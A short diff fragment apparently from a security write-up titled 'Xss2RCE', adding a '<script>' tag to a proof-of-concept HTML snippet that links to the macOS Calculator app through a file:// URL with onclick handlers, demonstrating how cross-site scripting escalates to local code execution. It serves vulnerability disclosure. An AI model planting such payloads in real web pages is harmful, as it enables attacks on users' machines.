@@ -44,6 +44,7 @@ Xss2RCE
 POC:
 
 ```
+<script>
 <a href="file:///Applications/Calculator.app" onclick="closewin();" id="alink">
 
 <input id="btn" onclick="test()">   </input>
